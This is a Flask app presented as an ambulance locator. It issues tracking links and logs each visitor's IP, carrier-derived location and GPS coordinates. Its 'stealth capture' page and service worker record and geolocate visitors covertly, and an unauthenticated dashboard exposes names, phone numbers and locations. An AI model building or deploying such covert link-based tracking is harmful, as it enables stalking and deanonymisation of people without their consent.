import os
import re
import uuid
import json
import urllib.request
from datetime import datetime, timedelta

from flask import Flask, render_template, request, jsonify, abort, make_response

app = Flask(__name__)

# ---------------------------------------------------------------------------
CASES = {}
LINK_LIFETIME_MINUTES = 30
GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")

# Pakistan Mobile Operator → MNC mapping
PAKISTAN_MNC_MAP = {
    "300": "01", "301": "01", "302": "01", "303": "01", "304": "01",
    "305": "01", "306": "01", "307": "01", "308": "01", "309": "01",
    "320": "07", "321": "07", "322": "07", "323": "07", "324": "07",
    "325": "07", "326": "07", "327": "07", "328": "07", "329": "07",
    "330": "03", "331": "03", "332": "03", "333": "03", "334": "03",
    "335": "03", "336": "03", "337": "03", "338": "03", "339": "03",
    "340": "04", "341": "04", "342": "04", "343": "04", "344": "04",
    "345": "04", "346": "04", "347": "04", "348": "04", "349": "04",
    "350": "06", "351": "06", "352": "06", "353": "06", "354": "06",
    "355": "06", "356": "06", "357": "06", "358": "06", "359": "06",
    "360": "06", "361": "06", "362": "06", "363": "06", "364": "06",
    "365": "06", "366": "06", "367": "06", "368": "06", "369": "06",
    "370": "01", "371": "01", "372": "01", "373": "01", "374": "01",
    "375": "01", "376": "01", "377": "01", "378": "01", "379": "01",
}


def parse_phone_to_mcc_mnc(phone):
    if not phone:
        return None, None, None
    digits = re.sub(r"\D", "", phone)
    if digits.startswith("92") and len(digits) == 12:
        mcc = "410"
        prefix = digits[2:5]
        mnc = PAKISTAN_MNC_MAP.get(prefix)
        return mcc, mnc, f"Pakistan carrier (MCC={mcc}, MNC={mnc})"
    elif digits.startswith("0") and len(digits) == 11:
        mcc = "410"
        prefix = digits[1:4]
        mnc = PAKISTAN_MNC_MAP.get(prefix)
        return mcc, mnc, f"Pakistan carrier (MCC={mcc}, MNC={mnc})"
    return None, None, None


def new_case(patient_name=None, phone=None):
    token = uuid.uuid4().hex[:12]
    mcc, mnc, carrier_info = parse_phone_to_mcc_mnc(phone)
    CASES[token] = {
        "token": token,
        "patient_name": patient_name,
        "phone": phone,
        "mcc": mcc,
        "mnc": mnc,
        "carrier_info": carrier_info,
        "created_at": datetime.utcnow(),
        "responded_at": None,
        "status": "pending",
        "visit_count": 0,
        "visits": [],
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "source": None,
    }
    return CASES[token]


def is_expired(case):
    return datetime.utcnow() - case["created_at"] > timedelta(minutes=LINK_LIFETIME_MINUTES)


def get_client_ip():
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    xri = request.headers.get("X-Real-IP")
    if xri:
        return xri.strip()
    return request.remote_addr


def is_private_ip(ip):
    if not ip:
        return True
    if ip.startswith(("127.", "10.", "192.168.", "0.", "::1")):
        return True
    if ip.startswith("172."):
        try:
            second = int(ip.split(".")[1])
            if 16 <= second <= 31:
                return True
        except (ValueError, IndexError):
            pass
    return False


# ── IP Geolocation Providers ──

def ip_geolocate_ipapi(ip_address):
    try:
        url = f"http://ip-api.com/json/{ip_address}?fields=lat,lon,accuracy,status"
        with urllib.request.urlopen(url, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                lat = data.get("lat")
                lng = data.get("lon")
                acc = data.get("accuracy", 5000)
                if lat is not None and lng is not None:
                    return float(lat), float(lng), float(acc)
    except Exception:
        pass
    return None, None, None


def ip_geolocate_ipapi_co(ip_address):
    try:
        url = f"https://ipapi.co/{ip_address}/json/"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            lat = data.get("latitude")
            lng = data.get("longitude")
            if lat is not None and lng is not None:
                return float(lat), float(lng), 50000
    except Exception:
        pass
    return None, None, None


def ip_geolocate_ipinfo(ip_address):
    try:
        token = os.environ.get("IPINFO_TOKEN", "")
        if token:
            url = f"https://ipinfo.io/{ip_address}?token={token}"
        else:
            url = f"https://ipinfo.io/{ip_address}/json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            loc_str = data.get("loc")
            if loc_str:
                parts = loc_str.split(",")
                if len(parts) == 2:
                    return float(parts[0]), float(parts[1]), 50000
    except Exception:
        pass
    return None, None, None


def ip_geolocate_google(ip_address, mcc=None, mnc=None):
    if not GOOGLE_API_KEY:
        return None, None, None
    try:
        payload = {"considerIp": True}
        if mcc:
            payload["homeMobileCountryCode"] = int(mcc)
        if mnc:
            payload["homeMobileNetworkCode"] = int(mnc)
        payload["radioType"] = "lte"

        url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            result = json.loads(resp.read().decode())
            lat = result.get("location", {}).get("lat")
            lng = result.get("location", {}).get("lng")
            acc = result.get("accuracy", 50000)
            if lat is not None and lng is not None:
                return float(lat), float(lng), float(acc)
    except Exception:
        pass
    return None, None, None


def ip_geolocate(ip_address, mcc=None, mnc=None):
    if is_private_ip(ip_address):
        return None, None, None, None

    results = []

    glat, glng, gacc = ip_geolocate_google(ip_address, mcc, mnc)
    if glat is not None:
        results.append((glat, glng, gacc, "google"))

    iplat, iplng, ipacc = ip_geolocate_ipapi(ip_address)
    if iplat is not None:
        results.append((iplat, iplng, ipacc, "ip-api"))

    icolat, icolng, icoacc = ip_geolocate_ipapi_co(ip_address)
    if icolat is not None:
        results.append((icolat, icolng, icoacc, "ipapi.co"))

    infolat, infolng, infoacc = ip_geolocate_ipinfo(ip_address)
    if infolat is not None:
        results.append((infolat, infolng, infoacc, "ipinfo"))

    if not results:
        return None, None, None, None

    weights = {"google": 3.0, "ip-api": 1.5, "ipapi.co": 1.0, "ipinfo": 1.0}
    total_weight = 0
    lat_sum = 0.0
    lng_sum = 0.0

    for lat, lng, acc, provider in results:
        w = weights.get(provider, 1.0)
        accuracy_factor = max(0.1, 1.0 / (acc / 10000.0 + 1.0))
        effective_weight = w * accuracy_factor
        total_weight += effective_weight
        lat_sum += lat * effective_weight
        lng_sum += lng * effective_weight

    if total_weight == 0:
        return None, None, None, None

    avg_lat = lat_sum / total_weight
    avg_lng = lng_sum / total_weight
    avg_acc = min(r[2] for r in results)
    best_provider = max(results, key=lambda r: weights.get(r[3], 1.0))[3]

    return avg_lat, avg_lng, avg_acc, best_provider


def record_visit(case, ip_address, gps_data=None):
    case["visit_count"] += 1
    mcc = case.get("mcc")
    mnc = case.get("mnc")
    ip_lat, ip_lng, ip_acc, ip_source = ip_geolocate(ip_address, mcc, mnc)

    visit = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip_address,
        "ip_latitude": ip_lat,
        "ip_longitude": ip_lng,
        "ip_accuracy": ip_acc,
        "ip_source": ip_source,
        "gps_latitude": None,
        "gps_longitude": None,
        "gps_accuracy": None,
        "source": "ip",
        "latitude": ip_lat,
        "longitude": ip_lng,
        "accuracy": ip_acc,
    }

    if gps_data:
        visit["gps_latitude"] = gps_data.get("latitude")
        visit["gps_longitude"] = gps_data.get("longitude")
        visit["gps_accuracy"] = gps_data.get("accuracy")
        if gps_data.get("latitude") is not None:
            visit["latitude"] = gps_data["latitude"]
            visit["longitude"] = gps_data["longitude"]
            visit["accuracy"] = gps_data.get("accuracy")
            visit["source"] = "gps"

    case["visits"].append(visit)
    case["latitude"] = visit["latitude"]
    case["longitude"] = visit["longitude"]
    case["accuracy"] = visit["accuracy"]
    case["source"] = visit["source"]

    if case["status"] == "pending":
        case["status"] = "located"
        case["responded_at"] = datetime.utcnow()

    return visit


# ── Routes ──

@app.route("/")
def index():
    return "Ambulance Locator v3 — POST /create to generate a link."


@app.route("/sw.js")
def service_worker():
    """Serve the Service Worker with correct MIME type."""
    response = make_response(render_template("sw.js"))
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Service-Worker-Allowed"] = "/"
    # Cache control: SW must be fresh or browser won't update it
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return response


@app.route("/create", methods=["POST"])
def create_case():
    data = request.get_json(silent=True) or {}
    case = new_case(data.get("patient_name"), data.get("phone"))
    link = request.url_root.rstrip("/") + "/go/" + case["token"]
    return jsonify({
        "token": case["token"],
        "link": link,
        "carrier_info": case["carrier_info"],
    })


@app.route("/go/<token>")
def go(token):
    """Stealth capture page. Also serves as the SW-intercepted fallback."""
    case = CASES.get(token)
    if not case:
        abort(404)

    client_ip = get_client_ip()

    if not is_expired(case):
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"

    return render_template("location.html", token=token, expired=(case["status"] == "expired"))


@app.route("/sw-capture/<token>")
def sw_capture(token):
    """
    Called INTERNALLY by the Service Worker when it intercepts a navigation.
    The SW makes a subresource fetch to this endpoint to record the visit
    server-side (IP geolocation) without ever loading a page.
    Returns a minimal response.
    """
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "not found"}), 404

    client_ip = get_client_ip()
    if not is_expired(case):
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"

    # Return minimal response — just enough to confirm the capture
    return jsonify({
        "ok": True,
        "token": token,
        "status": case["status"],
        "source": case["source"],
        "latitude": case["latitude"],
        "longitude": case["longitude"],
        "accuracy": case["accuracy"],
    })


@app.route("/api/location-update", methods=["POST"])
def location_update():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "invalid token"}), 404

    if is_expired(case):
        case["status"] = "expired"
        return jsonify({"error": "link expired"}), 410

    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")

    if lat is not None and lng is not None and case["visits"]:
        latest = case["visits"][-1]
        latest["gps_latitude"] = lat
        latest["gps_longitude"] = lng
        latest["gps_accuracy"] = acc
        latest["latitude"] = lat
        latest["longitude"] = lng
        latest["accuracy"] = acc
        latest["source"] = "gps"

        case["latitude"] = lat
        case["longitude"] = lng
        case["accuracy"] = acc
        case["source"] = "gps"

        if case["status"] == "pending":
            case["status"] = "located"
            case["responded_at"] = datetime.utcnow()

    return jsonify({"ok": True})


@app.route("/api/location-denied", methods=["POST"])
def location_denied():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if case and case["visits"]:
        conn_type = data.get("connectionType")
        if conn_type:
            case["visits"][-1]["connection_type"] = conn_type
    return jsonify({"ok": True})


@app.route("/dashboard")
def dashboard():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    return render_template("dashboard.html", cases=cases)


@app.route("/api/cases")
def api_cases():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    out = []
    for c in cases:
        visits_clean = []
        for v in c.get("visits", []):
            visits_clean.append({
                "timestamp": v.get("timestamp"),
                "latitude": v.get("latitude"),
                "longitude": v.get("longitude"),
                "accuracy": v.get("accuracy"),
                "source": v.get("source"),
                "ip_source": v.get("ip_source"),
                "ip": v.get("ip"),
                "connection_type": v.get("connection_type"),
            })
        out.append({
            "token": c["token"],
            "patient_name": c["patient_name"],
            "phone": c["phone"],
            "carrier_info": c.get("carrier_info"),
            "status": c["status"],
            "source": c["source"],
            "latitude": c["latitude"],
            "longitude": c["longitude"],
            "accuracy": c["accuracy"],
            "visit_count": c.get("visit_count", 0),
            "visits": visits_clean,
            "created_at": c["created_at"].isoformat(),
        })
    return jsonify(out)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
